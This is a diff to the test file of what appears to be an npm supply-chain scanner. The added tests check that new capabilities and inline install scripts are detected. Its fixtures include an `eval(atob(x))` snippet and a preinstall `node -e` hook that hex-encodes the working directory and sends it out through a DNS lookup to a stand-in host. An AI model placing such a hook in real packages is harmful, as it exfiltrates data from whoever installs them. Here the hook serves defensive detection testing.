@@ -3,7 +3,7 @@
 import json
 
 from kitsunox.core.models import PackageVersionRef, PublishInfo, Severity, VersionSnapshot
-from kitsunox.ecosystems.npm.install import install_entry_files
+from kitsunox.ecosystems.npm.install import install_sources
 from kitsunox.ecosystems.npm.rules import install_code
 from kitsunox.ecosystems.npm.rules.install_code import InstallScriptChanged, InstallScriptCode
 from kitsunox.rules.capabilities import CapabilityGained
@@ -26,7 +26,7 @@ def pkg(hook: str | None = None, files: dict[str, bytes] | None = None) -> dict[
 
 
 def change(new: dict[str, bytes], base: dict[str, bytes] | None) -> CodeChange:
-    return code_change(SNAP, new, base, CACHE, install_entry_files, "1.0.0")
+    return code_change(SNAP, new, base, CACHE, install_sources, "1.0.0")
 
 
 def test_gaining_network_with_env_is_medium() -> None:
@@ -35,6 +35,16 @@ def test_gaining_network_with_env_is_medium() -> None:
     assert finding.severity is Severity.MEDIUM
     assert "env-all, network" in finding.explanation
     assert {e.path for e in finding.evidence} == {"lib/x.js"}
+
+
+def test_gaining_the_environment_without_network_is_low() -> None:
+    """v2: apps that start reading `process.env` were the commonest MEDIUM-only report."""
+    env = pkg(files={"lib/x.js": b"const v = process.env"})
+    (finding,) = CapabilityGained().evaluate_code(change(env, PLAIN))
+    assert finding.severity is Severity.LOW
+    dynamic = pkg(files={"lib/x.js": b"eval(atob(x))"})
+    (finding,) = CapabilityGained().evaluate_code(change(dynamic, PLAIN))
+    assert finding.severity is Severity.MEDIUM
 
 
 def test_gaining_only_network_is_low_and_nothing_for_new_packages() -> None:
@@ -117,3 +127,15 @@ def test_an_install_file_that_changed_only_its_own_version_is_unchanged() -> Non
     assert InstallScriptChanged().evaluate_code(change(new, old)) == ()  # SNAP is 1.0.1
     other = pkg("node i.js", {"i.js": b"download(`evil@1.0.1`)"})
     assert len(InstallScriptChanged().evaluate_code(change(other, old))) == 1
+
+
+def test_inline_install_code_is_read() -> None:
+    """`dependencykfeg`: the whole payload was a `node -e` one-liner, which named no file."""
+    hook = (
+        "node -e \"const dns = require('dns'); const d = Buffer.from(process.cwd())"
+        ".toString('hex'); dns.lookup(d + '.x.example', () => {});\""
+    )
+    new = {"package.json": json.dumps({"scripts": {"preinstall": hook}}).encode()}
+    (finding,) = InstallScriptCode().evaluate_code(change(new, None))
+    assert "package.json#scripts.preinstall.js" in finding.explanation
+    assert "network" in finding.explanation
